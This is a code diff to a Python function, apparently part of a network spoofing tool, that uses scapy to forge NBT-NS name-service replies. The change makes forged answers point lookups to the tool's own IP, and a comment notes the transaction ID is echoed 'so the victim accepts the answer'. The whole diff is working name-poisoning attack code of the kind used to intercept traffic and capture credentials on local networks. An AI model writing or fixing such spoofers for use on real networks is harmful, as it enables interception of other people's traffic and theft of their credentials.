@@ -76,15 +76,26 @@ def build_response(pkt, our_ip: str):
 
     if pkt.haslayer(UDP) and int(pkt[UDP].dport) == _NBNS_PORT:
         try:
-            from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
+            from scapy.layers.netbios import (
+                NBNS_ADD_ENTRY,
+                NBNSHeader,
+                NBNSQueryRequest,
+                NBNSQueryResponse,
+            )
             if pkt.haslayer(NBNSQueryRequest):
                 q = pkt[NBNSQueryRequest]
+                # the transaction id lives on the NBNSHeader (a separate layer
+                # in current scapy); echo it so the victim accepts the answer
+                hdr = pkt.getlayer(NBNSHeader)
+                trn = int(hdr.NAME_TRN_ID) if hdr is not None else 0
                 return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
                         / UDP(sport=_NBNS_PORT, dport=pkt[UDP].sport)
-                        / NBNSQueryResponse(NAME_TRN_ID=q.NAME_TRN_ID,
-                                            RR_NAME=q.QUESTION_NAME))
+                        / NBNSHeader(NAME_TRN_ID=trn, RESPONSE=1, OPCODE=0,
+                                     NM_FLAGS=0x1, ANCOUNT=1)
+                        / NBNSQueryResponse(RR_NAME=q.QUESTION_NAME, SUFFIX=q.SUFFIX,
+                                            ADDR_ENTRY=[NBNS_ADD_ENTRY(NB_ADDRESS=our_ip)]))
         except Exception:
-            pass
+            log.debug("NBT-NS response crafting failed", exc_info=True)
     return None
 
 
